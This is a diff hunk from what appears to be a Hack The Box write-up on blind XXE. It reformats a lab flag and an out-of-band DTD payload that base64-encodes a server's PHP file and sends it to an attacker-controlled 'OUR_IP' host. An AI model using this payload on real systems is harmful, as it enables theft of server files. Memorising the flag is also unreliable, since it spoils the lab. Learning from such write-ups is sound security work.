@@ -111,10 +111,10 @@ Answer: HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}
 Explanation: As this is XXE Blind Vulnerability, now the answer shouold be shown in open server on localhost. 
 First, create the xml DTD file:
 
-"""
+```
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=<file>.php">
 <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
-"""
+```
 
 and then, to decode the shown content that will be in the open server output:
  
